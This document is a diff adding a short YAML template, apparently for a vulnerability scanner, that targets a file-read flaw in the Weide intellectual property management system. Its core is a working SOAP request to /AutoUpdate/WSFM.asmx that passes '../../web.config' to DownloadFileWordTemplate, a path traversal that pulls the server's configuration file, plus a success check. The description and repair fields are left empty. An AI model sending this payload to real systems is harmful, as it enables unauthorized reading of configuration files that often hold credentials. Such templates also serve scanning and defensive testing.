@@ -1,0 +1,30 @@
+id:
+
+info:
+  name: 唯徳知识产权管理系统 DownloadFileWordTemplate 文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /AutoUpdate/WSFM.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    Content-Length: length
+    SOAPAction: "http://tempuri.org/DownloadFileWordTemplate"
+  data: |
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+    <soap:Body>
+    <DownloadFileWordTemplate xmlns="http://tempuri.org/">
+    <fileName>../../web.config</fileName>
+    </DownloadFileWordTemplate>
+    </soap:Body>
+    </soap:Envelope>
+response1:
+  headers:
+  body: DownloadFileWordTemplateResult
+  code: 200
+requests2:
+response2:
